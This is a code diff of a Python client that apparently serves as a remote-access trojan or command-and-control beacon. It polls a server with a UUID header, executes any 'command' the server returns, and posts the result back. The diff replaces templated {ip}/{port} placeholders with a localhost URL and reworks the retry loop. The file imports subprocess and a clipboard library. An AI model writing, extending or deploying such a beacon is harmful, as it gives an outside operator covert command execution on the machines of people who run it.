@@ -5,9 +5,7 @@ import os
 import subprocess
 import pyperclip
 
-ip = "{ip}"
-port = "{port}"
-server_url = "http://"+ip+":"+port+"/client"
+server_url = "http://127.0.0.1:8080/client"
 client_uuid = str(uuid.uuid4())
 
 print(client_uuid)
@@ -81,38 +79,22 @@ def handle_command(command):
         return {"status": "error", "message": str(e)}
     return result
 
-def make_request_with_retries(url, headers, data=None, method="GET", retries=5, retry_delay=10):
-    for attempt in range(retries):
-        try:
-            if method == "POST":
-                response = requests.post(url, headers=headers, json=data, timeout=10)
-            else:
-                response = requests.get(url, headers=headers, timeout=10)
-            return response
-        except requests.ConnectionError as e:
-            print(f"Connection error, retrying in {retry_delay} seconds: {e}")
-            time.sleep(retry_delay)
-        except requests.RequestException as e:
-            print(f"Request error: {e}")
-            break
-    return None
-
 while True:
-    response = make_request_with_retries(server_url, headers={"UUID": client_uuid}, retries=5)
-    if response:
-        try:
-            server_data = response.json()
-            print("Server Response:", server_data)
+    try:
+        response = requests.get(server_url, headers={"UUID": client_uuid}, timeout=10)
+        server_data = response.json()
+        print("Server Response:", server_data)
 
-            if "command" in server_data:
-                command = server_data["command"]
-                result = handle_command(command)
-                print("Command Result:", result)
-                make_request_with_retries(
-                    server_url, headers={"UUID": client_uuid}, data={"result": result}, method="POST"
-                )
-        except Exception as e:
-            print("Error processing server response:", e)
-    else:
-        print("Failed to connect to server after retries, waiting before next attempt.")
-    time.sleep(3)
+        if "command" in server_data:
+            command = server_data["command"]
+            result = handle_command(command)
+            print("Command Result:", result)
+            requests.post(server_url, headers={"UUID": client_uuid}, json={"result": result})
+    except requests.ConnectionError as e:
+        print("Connection error, retrying in 30 seconds:", e)
+        time.sleep(30)  # 等待 30 秒后重试
+    except requests.RequestException as e:
+        print("Request error:", e)
+    except Exception as e:
+        print("Unexpected error:", e)
+    time.sleep(5)  # 默认请求间隔
